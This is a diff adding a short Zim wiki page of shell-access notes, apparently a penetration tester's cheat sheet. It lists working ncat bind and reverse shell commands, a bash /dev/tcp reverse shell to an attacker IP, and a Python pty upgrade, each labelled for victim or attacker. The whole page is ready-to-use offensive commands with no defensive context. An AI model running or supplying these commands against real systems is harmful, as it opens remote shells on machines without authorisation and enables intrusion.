@@ -1,0 +1,19 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.4
+Creation-Date: 2020-10-30T12:58:08-07:00
+
+====== Shells ======
+Created Friday 30 October 2020
+
+Start bind shell (on victim):
+# ncat -l -p 2305 -e "/bin/bash -i"
+Connect to bind shell (on attacker):
+# ncat 10.5.23.42 2305
+Listen for reverse shell (on attacker):
+# ncat -l -p 23
+Start reverse shell (on victim):
+# ncat -e "/bin/bash -i" 10.5.23.5 23
+Start reverse shell with bash only (on victim):
+# bash -i &>/dev/tcp/10.5.23.5/42 0>&1
+Upgrade to pseudo terminal:
+# python -c 'import pty;pty.spawn("/bin/bash")'
